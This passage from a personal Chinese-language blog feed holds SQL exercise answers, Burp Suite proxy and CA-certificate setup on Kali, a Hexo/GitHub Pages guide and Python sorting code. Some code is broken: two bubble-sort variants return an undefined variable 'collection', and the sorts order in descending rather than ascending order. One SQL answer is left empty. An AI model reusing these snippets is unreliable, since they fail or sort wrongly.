class="number">100</span>,<span class="number">0</span>)</span><br><span class="line">   <span class="keyword">FROM</span> employees</span><br><span class="line">   <span class="keyword">where</span> years_employed <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>)</span><br><span class="line">   <span class="keyword">group</span> <span class="keyword">by</span> Years_employed</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">round(数值,小数点保留的位数)</span><br></pre></td></tr></table></figure></li></ol><h2 id="lesson-11-统计2"><a href="#lesson-11-统计2" class="headerlink" title="lesson 11 统计2"></a>lesson 11 统计2</h2><ol><li><p>统计一下Artist角色的雇员数量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">count</span>(<span class="keyword">role</span>) <span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">role</span></span><br><span class="line"><span class="keyword">having</span> <span class="keyword">role</span> <span class="keyword">like</span> <span class="string">'artist'</span></span><br></pre></td></tr></table></figure></li><li><p>按角色统计一下每个角色的雇员数量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">role</span>,<span class="keyword">count</span>(<span class="keyword">role</span>) <span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">role</span></span><br></pre></td></tr></table></figure></li><li><p>算出Engineer角色的就职年份总计</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">sum</span>(Years_employed) <span class="keyword">FROM</span> employees </span><br><span class="line"><span class="keyword">where</span> <span class="keyword">role</span> <span class="keyword">like</span> <span class="string">'engineer'</span></span><br></pre></td></tr></table></figure></li><li><p>按角色分组算出每个角色按有办公室和没办公室的统计人数(列出角色，数量，有无办公室,注意一个角色如果部分有办公室，部分没有需分开统计）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">role</span>,<span class="keyword">count</span>(building) <span class="keyword">as</span> <span class="built_in">number</span>,<span class="string">"yes"</span> <span class="keyword">FROM</span> employees a </span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">role</span> </span><br><span class="line"><span class="keyword">union</span> </span><br><span class="line"><span class="keyword">select</span> <span class="keyword">role</span>,<span class="keyword">count</span>(<span class="keyword">name</span>),<span class="string">"no"</span> <span class="keyword">from</span> employees b </span><br><span class="line"><span class="keyword">where</span> building <span class="keyword">is</span> <span class="literal">null</span> </span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">role</span></span><br></pre></td></tr></table></figure></li><li><p>按角色和就职年份统计人数,年份按0-3，3-6，6-9这种阶梯分组，最后按角色+阶梯分组排序</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure></li></ol><h2 id="lesson-12"><a href="#lesson-12" class="headerlink" title="lesson 12"></a>lesson 12</h2><ol><li><p>统计出每一个导演的电影数量（列出导演名字和数量）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> director,<span class="keyword">count</span>(*) <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> director</span><br></pre></td></tr></table></figure></li><li><p>统计一下每个导演的销售总额(列出导演名字和销售总额)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> director,<span class="keyword">sum</span>(International_sales)+<span class="keyword">sum</span>(domestic_sales) <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span> boxoffice</span><br><span class="line">    <span class="keyword">on</span> movies.id = boxoffice.movie_id</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> director</span><br></pre></td></tr></table></figure></li><li><p>按导演分组计算销售总额,求出平均销售额冠军（统计结果过滤掉只有单部电影的导演，列出导演名，总销量，电影数量，平均销量)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> director,<span class="keyword">sum</span>(Domestic_sales+International_sales)<span class="keyword">as</span> sales,<span class="keyword">count</span>(director),<span class="keyword">sum</span>(Domestic_sales+International_sales)/<span class="keyword">count</span>(director) <span class="keyword">as</span> avgsales</span><br><span class="line"><span class="keyword">FROM</span> movies <span class="keyword">as</span> m</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> Boxoffice <span class="keyword">as</span> b</span><br><span class="line"><span class="keyword">on</span> b.movie_id=m.id</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> director</span><br><span class="line"><span class="keyword">having</span> <span class="keyword">count</span>(Director)&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> Avgsales <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></li><li><p>找出每部电影和单部电影销售冠军之间的销售差，列出电影名，销售额差额</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> title,(<span class="keyword">select</span> <span class="keyword">max</span>(Domestic_sales+International_sales) <span class="keyword">from</span> Boxoffice)-(Domestic_sales+International_sales) <span class="keyword">as</span> sales</span><br><span class="line"><span class="keyword">FROM</span> movies <span class="keyword">as</span> m</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> Boxoffice <span class="keyword">as</span> b</span><br><span class="line"><span class="keyword">on</span> b.movie_id=m.id</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;sql-wp&quot;&gt;&lt;a href=&quot;#sql-wp&quot; class=&quot;headerlink&quot; title=&quot;sql wp&quot;&gt;&lt;/a&gt;sql wp&lt;/h1&gt;&lt;h2 id=&quot;网址&quot;&gt;&lt;a href=&quot;#网址&quot; class=&quot;headerlink&quot; title=&quot;网址&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="sql" scheme="https://mercer5.github.io/categories/sql/"/>
    
    
      <category term="sql" scheme="https://mercer5.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>burpsuit 试水</title>
    <link href="https://mercer5.github.io/2020/02/12/bp-%E8%AF%95%E6%B0%B4/"/>
    <id>https://mercer5.github.io/2020/02/12/bp-%E8%AF%95%E6%B0%B4/</id>
    <published>2020-02-12T13:32:51.000Z</published>
    <updated>2020-08-24T15:30:09.736Z</updated>
    
    <content type="html"><![CDATA[<h1 id="burpsuit-试水"><a href="#burpsuit-试水" class="headerlink" title="burpsuit 试水"></a>burpsuit 试水</h1><h2 id="设备"><a href="#设备" class="headerlink" title="设备"></a>设备</h2><ol><li>kali</li><li>firefox esr</li><li>burpsuit</li></ol><h2 id="不必要的准备"><a href="#不必要的准备" class="headerlink" title="不必要的准备"></a>不必要的准备</h2><p>以上设备都是kali自带的</p><p>然后我把火狐设置成中文了(英语渣伤不起啊啊啊啊)</p><p>以下是设置成中文的步骤</p><ol><li><p>终端执行:<code>sudo apt -y install firefox-esr-l10n-zh-cn</code></p></li><li><p>设置首选项</p><img src="00822enrly1gbtx6gzl5hj30be0mhwg8.jpg" alt="Snipaste_2020-02-12_21-01-36.png" style="zoom:67%;" /></li><li><p>语言选项</p><img src="00822enrly1gbtx6zf6kcj30rq077jrs.jpg" alt="Snipaste_2020-02-12_21-02-53.png" style="zoom:67%;" /></li><li><p>选择语言</p><img src="00822enrly1gbtx798ju0j30jb0990t8.jpg" alt="Snipaste_2020-02-12_21-03-28.png" style="zoom:67%;" /></li><li><p>加入并确认</p><img src="00822enrly1gbtx7pzid9j30j509hgm3.jpg" alt="Snipaste_2020-02-12_21-04-05.png" style="zoom:67%;" /></li></ol><h2 id="设置代理及证书"><a href="#设置代理及证书" class="headerlink" title="设置代理及证书"></a>设置代理及证书</h2><ol><li><p>菜单-&gt;首选项-&gt;常规-&gt;拉到最下面-&gt;网络设置</p><img src="00822enrly1gbtxlbobp7j30pv0j2768.jpg" alt="Snipaste_2020-02-12_21-09-50.png" style="zoom:67%;" /></li><li><p>设置代理</p><img src="00822enrly1gbtxlp4s27j30ly0a3gmq.jpg" alt="Snipaste_2020-02-12_21-10-37.png" style="zoom:67%;" /></li><li><p>打开bp</p></li><li><p>在火狐中输入:<a href="http://burp/" target="_blank" rel="noopener">http://burp/</a>       <strong>必须先打开bp</strong></p></li><li><p>下载</p><img src="00822enrly1gbtxlwyuqwj30n203ojrf.jpg" alt="Snipaste_2020-02-12_21-15-28.png" style="zoom:67%;" /></li><li><p>保存</p><img src="00822enrly1gbtxmfkusgj30dy0ahdgk.jpg" alt="Snipaste_2020-02-12_21-16-10.png" style="zoom:67%;" /></li><li><p>在查看证书中确认</p><img src="00822enrly1gbtxmpddtpj30m50d475n.jpg" alt="Snipaste_2020-02-12_21-17-28.png" style="zoom:67%;" /></li><li><p>导入,选中下载的文件,全点信任,ojbk</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;burpsuit-试水&quot;&gt;&lt;a href=&quot;#burpsuit-试水&quot; class=&quot;headerlink&quot; title=&quot;burpsuit 试水&quot;&gt;&lt;/a&gt;burpsuit 试水&lt;/h1&gt;&lt;h2 id=&quot;设备&quot;&gt;&lt;a href=&quot;#设备&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="web" scheme="https://mercer5.github.io/categories/web/"/>
    
    
      <category term="web" scheme="https://mercer5.github.io/tags/web/"/>
    
      <category term="burp" scheme="https://mercer5.github.io/tags/burp/"/>
    
  </entry>
  
  <entry>
    <title>如何搭建blog</title>
    <link href="https://mercer5.github.io/2020/02/10/%E6%90%AD%E5%BB%BAblog-github/"/>
    <id>https://mercer5.github.io/2020/02/10/%E6%90%AD%E5%BB%BAblog-github/</id>
    <published>2020-02-10T09:15:51.000Z</published>
    <updated>2020-08-24T15:30:09.847Z</updated>
    
    <content type="html"><![CDATA[<h1 id="如何搭建blog"><a href="#如何搭建blog" class="headerlink" title="如何搭建blog"></a>如何搭建blog</h1><h2 id="使用软件"><a href="#使用软件" class="headerlink" title="使用软件"></a>使用软件</h2><p><strong>本人系统win10</strong></p><p>Node.js,Git,hexo,sublimetext.</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Hexo 基于 Node.js，搭建过程中还需要使用 npm（Node.js 已带） 和 git</p><p>因此先搭建本地操作环境，安装 Node.js 和 Git。</p><ul><li>Node.js:<a href="https://nodejs.org/zh-cn/" target="_blank" rel="noopener">https://nodejs.org/zh-cn/</a></li><li>Git:<a href="https://git-scm.com/download/win" target="_blank" rel="noopener">https://git-scm.com/download/win</a></li></ul><p>一路点击<strong>下一步</strong></p><h3 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h3><p>Win+R 输入 cmd </p><p>输入 node -v</p><p>输入npm -v</p><p>输入git –version </p><p>若分别出现各自的版本号,就ok了.如图</p><p><img src="1.jpg" alt="1"></p><h2 id="连接github"><a href="#连接github" class="headerlink" title="连接github"></a>连接github</h2><h3 id="注册github"><a href="#注册github" class="headerlink" title="注册github:"></a>注册github:</h3><p>要想连接github,首先你要有: )</p><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><ul><li>打开git bash</li><li>设置用户名和邮箱</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git<span class="built_in"> config </span>--global user.name <span class="string">"GitHub 用户名"</span></span><br><span class="line">git<span class="built_in"> config </span>--global user.email <span class="string">"GitHub 邮箱"</span></span><br></pre></td></tr></table></figure><ul><li>创建ssh密钥</li></ul><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -<span class="built_in">t</span> rsa -C <span class="string">"GitHub 邮箱"</span>           (一路回车就行)</span><br></pre></td></tr></table></figure><p><img src="2.jpg" alt="2"></p><ul><li>添加密钥</li></ul><p>进入<strong>上图划绿线</strong>的目录，用<strong>记事本</strong>打开公钥<strong>id_rsa.pub</strong>文件并复制里面的内容。</p><p>登陆 GitHub ，进入 Settings 页面，选择左边栏的 SSH and GPG keys，点击 New SSH key。</p><p>Title 随便取个名字，粘贴复制的 id_rsa.pub 内容到 Key 中，点击 Add SSH key 完成添加。</p><h2 id="创建github-pages-仓库"><a href="#创建github-pages-仓库" class="headerlink" title="创建github pages 仓库"></a>创建github pages 仓库</h2><ol><li>GitHub 主页右上角加号 -&gt; New repository：</li></ol><ul><li>Repository name 中输入<strong>用户名.github.io</strong></li><li><strong>勾选</strong> “Initialize this repository with a README”</li><li>Description <strong>选填</strong></li></ul><ol start="2"><li>填好后点击 Create repository 创建。</li></ol><p><img src="3.jpg" alt="3"></p><p><img src="4.jpg" alt="4"></p><ol start="3"><li>创建后默认自动启用 HTTPS，博客地址为：<strong>https://用户名.github.io</strong></li></ol><h2 id="本地安装-Hexo-博客程序"><a href="#本地安装-Hexo-博客程序" class="headerlink" title="本地安装 Hexo 博客程序"></a>本地安装 Hexo 博客程序</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><ul><li><p>打开git bash</p></li><li><p>使用 npm 一键安装 Hexo 博客程序：</p></li></ul><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-<span class="keyword">cli</span> -g</span><br></pre></td></tr></table></figure><h3 id="hexo-初始化和本地浏览"><a href="#hexo-初始化和本地浏览" class="headerlink" title="hexo 初始化和本地浏览"></a>hexo 初始化和本地浏览</h3><ul><li>初始化并安装所需组件</li></ul><p>win + R,     cmd,       回车</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init 博客名      <span class="comment"># 初始化</span></span><br><span class="line"><span class="built_in">cd</span> 博客名             <span class="comment"># 进入目录</span></span><br><span class="line">npm install          <span class="comment"># 安装组件</span></span><br></pre></td></tr></table></figure><ul><li>启动本地程序并浏览</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hexo</span> g   <span class="comment"># 生成页面</span></span><br><span class="line">hexo s   <span class="comment"># 启动预览</span></span><br></pre></td></tr></table></figure><p>浏览器中访问 <code>http://localhost:4000</code>，出现 Hexo 默认页面，本地博客安装成功！</p><h2 id="部署-Hexo-到-GitHub-Pages"><a href="#部署-Hexo-到-GitHub-Pages" class="headerlink" title="部署 Hexo 到 GitHub Pages"></a>部署 Hexo 到 GitHub Pages</h2><h3 id="Sublime-Text"><a href="#Sublime-Text" class="headerlink" title="Sublime Text"></a>Sublime Text</h3><ol><li>安装</li></ol><ul><li>Sublime Text:<a href="https://www.sublimetext.com/3" target="_blank" rel="noopener">https://www.sublimetext.com/3</a></li><li>一路回车</li></ul><ol start="2"><li>使用</li></ol><ul><li>打开后将blog所在文件夹往里面拖即可</li></ul><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><ol><li>安装 hexo-deployer-git：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="keyword">install</span> hexo-deployer-git <span class="comment">--save</span></span><br></pre></td></tr></table></figure><ol start="2"><li>在Sublime Text中改些配置</li></ol><ul><li><strong>修改 _config.yml</strong> 文件末尾的 Deployment 部分</li></ul><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">deploy</span>:</span><br><span class="line">  <span class="attribute">type</span>: git</span><br><span class="line">  <span class="attribute">repo</span>: git<span class="variable">@github</span>.<span class="attribute">com</span>:用户名/用户名.github.io.git</span><br><span class="line">  <span class="attribute">branch</span>: master</span><br></pre></td></tr></table></figure><p>repo可在github仓库直接复制</p><p><img src="5.jpg" alt="5"></p><ul><li><strong>修改 _config.yml</strong> 文件开头的 url 部分,改为自己blog地址</li></ul><p><img src="6.jpg" alt="6"></p><ul><li><p><strong>修改 _config.yml</strong> 文件开头的 site 部分</p><p>搜索关键词Site，如下：</p></li></ul><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># Site</span></span><br><span class="line"><span class="symbol">title:</span> Chloneda             <span class="meta">#你的站点标题</span></span><br><span class="line"><span class="symbol">subtitle:</span> Less is more</span><br><span class="line"><span class="symbol">description:</span> Less is more   <span class="meta">#你的站点描述</span></span><br><span class="line"><span class="symbol">keywords:</span> chloneda</span><br><span class="line"><span class="symbol">author:</span> chloneda            <span class="meta">#站点作者</span></span><br></pre></td></tr></table></figure><h3 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h3><p>传到github上</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hexo d</span></span><br></pre></td></tr></table></figure><h3 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h3><p>在浏览器中输入github域名<code>https://用户名.github.io</code>,就可以看到hexo网站了.</p><h2 id="next"><a href="#next" class="headerlink" title="next"></a>next</h2><ol><li><p>下载主题</p></li><li><p>将主题文件拷贝至站点目录的 <code>themes</code> 目录</p></li><li><p>打开 <strong>站点配置文件</strong>， 找到 <code>theme</code> 字段，并将其值更改为 <code>next</code>(就可以使用该主题了)</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Extensions</span><br><span class="line">## Plugins: https:<span class="comment">//hexo.io/plugins/</span></span><br><span class="line">## Themes: https:<span class="comment">//hexo.io/themes/</span></span><br><span class="line">theme: next</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;如何搭建blog&quot;&gt;&lt;a href=&quot;#如何搭建blog&quot; class=&quot;headerlink&quot; title=&quot;如何搭建blog&quot;&gt;&lt;/a&gt;如何搭建blog&lt;/h1&gt;&lt;h2 id=&quot;使用软件&quot;&gt;&lt;a href=&quot;#使用软件&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="blog" scheme="https://mercer5.github.io/categories/blog/"/>
    
    
      <category term="blog" scheme="https://mercer5.github.io/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>python排序算法集合</title>
    <link href="https://mercer5.github.io/2019/12/20/python-%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"/>
    <id>https://mercer5.github.io/2019/12/20/python-%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</id>
    <published>2019-12-20T11:35:51.000Z</published>
    <updated>2020-08-24T15:30:09.747Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python-排序算法"><a href="#python-排序算法" class="headerlink" title="python 排序算法"></a>python 排序算法</h1><h2 id="0-相关知识"><a href="#0-相关知识" class="headerlink" title="0.相关知识"></a>0.相关知识</h2><p><strong>内部排序</strong></p><p>若整个排序过程不需要访问外存便能完成，则称此类排序问题为内部排序。</p><p><strong>外部排序</strong></p><p>若参加排序的记录数量很大，整个序列的排序过程不可能在内存中完成，则称此类排序问题为外部排序。</p><p><strong>就地排序</strong></p><p>若排序算法所需的辅助空间并不依赖于问题的规模n，即辅助空间为O（1），称为就地排序。</p><p><strong>稳定排序</strong></p><p>假定在待排序的记录序列中，存在多个具有相同的关键字的记录，若经过排序后，这些记录的相对次序保持不变，即在原序列中 ri=rj， ri 在 rj 之前，而在排序后的序列中，ri 仍在 rj 之前，则称这种排序算法是稳定的；否则称为不稳定的。</p><p><strong>排序序列分布</strong></p><p>排序需要考虑待排序关键字的分布情况，这会影响对排序算法的选择，通常我们在分析下列算法时都考虑关键字分布是随机分布的，不是按照某种规律分布的，比如正态分布等。</p><p><strong>待排序序列</strong></p><p>排序序列中，剩余即将要排序的序列部分。</p><p><strong>已排序序列</strong></p><p>排序序列中，已经排序好的序列部分。</p><p><strong>哨兵</strong></p><p>一切为简化边界条件而引入的附加结点(元素)均可称为哨兵</p><h2 id="1-冒泡排序"><a href="#1-冒泡排序" class="headerlink" title="1.冒泡排序"></a>1.冒泡排序</h2><p><strong>步骤</strong></p><ol><li>比较相邻的元素。如果第一个比第二个大，就交换他们两个。</li><li>对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。这步做完后，最后的元素会是最大的数。</li><li>针对所有的元素重复以上的步骤，除了最后一个。</li><li>持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。</li></ol><p><strong>比较次数</strong></p><p>n * (n-1) / 2 </p><p><strong>算法评价</strong></p><p>优点：如果你不是故意去交换相等的关键码的话，这个算法是绝对稳定的排序算法。</p><p>缺点：比较次数也就是所谓的时间复杂度 为O(n^2^)，最好的情况和最坏的情况都是O(n^2^)。</p><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bubbleSort</span><span class="params">(arr)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(arr)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(arr)-i):</span><br><span class="line">            <span class="keyword">if</span> arr[j]&lt;arr[j+<span class="number">1</span>]:</span><br><span class="line">                arr[j], arr[j + <span class="number">1</span>] = arr[j + <span class="number">1</span>], arr[j]</span><br><span class="line">    <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><p><strong>优化代码1</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bubble_sort1</span><span class="params">(arr)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    如果没有元素交换，说明数据在排序过程中已经有序，直接退出循环</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(arr)):</span><br><span class="line">        swapped = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(arr)-i):</span><br><span class="line">            <span class="keyword">if</span> arr[j]&lt;arr[j+<span class="number">1</span>]:</span><br><span class="line">                swapped = <span class="literal">True</span></span><br><span class="line">                arr[j], arr[j + <span class="number">1</span>] = arr[j + <span class="number">1</span>], arr[j]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> swapped: </span><br><span class="line">            <span class="keyword">break</span>  <span class="comment"># Stop iteration if the collection is sorted.</span></span><br><span class="line">    <span class="keyword">return</span> collection</span><br></pre></td></tr></table></figure><p><strong>优化代码2</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bubble_sort2</span><span class="params">(arr)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    bubble_sort1的基础上再优化。</span></span><br><span class="line"><span class="string">    优化思路：在排序的过程中，数据可以从中间分为两段，一段是无序状态，另一段是有序状态。</span></span><br><span class="line"><span class="string">    每一次循环的过程中，记录最后一个交换元素的index，它便是有序和无序状态的边界</span></span><br><span class="line"><span class="string">    下一次仅循环到边界即可，从而减少循环次数，达到优化。</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    compare_count=<span class="number">0</span></span><br><span class="line">    last_change_index = <span class="number">0</span> <span class="comment">#最后一个交换的位置</span></span><br><span class="line">    border = len(arr)<span class="number">-1</span> <span class="comment">#有序和无序的分界线</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(arr)):</span><br><span class="line">        swapped = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(border):</span><br><span class="line">            <span class="keyword">if</span> arr[j]&lt;arr[j+<span class="number">1</span>]:</span><br><span class="line">                swapped = <span class="literal">True</span></span><br><span class="line">                arr[j], arr[j + <span class="number">1</span>] = arr[j + <span class="number">1</span>], arr[j]</span><br><span class="line">                last_change_index = j</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> swapped: </span><br><span class="line">            <span class="keyword">break</span>  <span class="comment"># Stop iteration if the collection is sorted.</span></span><br><span class="line">        border = last_change_index <span class="comment"># 最后一个交换的位置就是边界</span></span><br><span class="line">    <span class="keyword">return</span> collection</span><br></pre></td></tr></table></figure><h2 id="2-快速排序"><a href="#2-快速排序" class="headerlink" title="2.快速排序"></a>2.快速排序</h2><p><strong>简介</strong></p><p>快速排序是由东尼·霍尔所发展的一种排序算法。在平均状况下，排序 n 个项目要 Ο(nlogn) 次比较。在最坏状况下则需要 Ο(n2) 次比较，但这种状况并不常见。事实上，快速排序通常明显比其他 Ο(nlogn) 算法更快，因为它的内部循环（inner loop）可以在大部分的架构上很有效率地被实现出来。</p><p>快速排序使用分治法（Divide and conquer）策略来把一个串行（list）分为两个子串行（sub-lists）。</p><p>快速排序又是一种分而治之思想在排序算法上的典型应用。本质上来看，快速排序应该算是在冒泡排序基础上的递归分治法。</p><p><strong>步骤</strong></p><ol><li>从数列中挑出一个元素，称为 “基准”（pivot）;</li><li>重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作；</li><li>递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序；</li></ol><p>递归的最底部情形，是数列的大小是零或一，也就是永远都已经被排序好了。虽然一直递归下去，但是这个算法总会退出，因为在每次的迭代（iteration）中，它至少会把一个元素摆到它最后的位置去。</p><p><strong>代码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def quicksort(array):</span><br><span class="line">    if len(array)&lt;2:</span><br><span class="line">        return array#基线条件：为空或者只包含一个元素的数组是有序的</span><br><span class="line">    else:</span><br><span class="line">        pivot&#x3D;array[0]#基准值</span><br><span class="line">        less&#x3D;[i for i in array[1:] if i&lt;&#x3D;pivot]#由小于基准值的数构成的子数列</span><br><span class="line">        more&#x3D;[i for i in array[1:] if i&gt;pivot]#由大于基准值的数构成的子数列</span><br><span class="line">        return quicksort(less)+[pivot]+quicksort(more)</span><br></pre></td></tr></table></figure><p><strong>简单评价</strong></p><ol><li>最坏情况</li></ol><p>快速排序的最坏情况，实际上就退化为了冒泡排序的情况，想想冒泡排序，每一轮比较后，都将原来的排序好的区间增加了一个长度，也就是说快速排序每次选择的pivot也正好达成了冒泡排序的作用，那么最坏情况就此发生。简单来说，最坏情况发生在每次划分过程产生的两个区间分别包含n-1个元素和1个元素的时候。那么不难知道，最坏情况的复杂度也为 O(n^2)。</p><ol start="2"><li>最好情况</li></ol><p>如果每次划分过程产生的区间大小都为n/2，则快速排序法运行就快得多了，此时的时间复杂度为 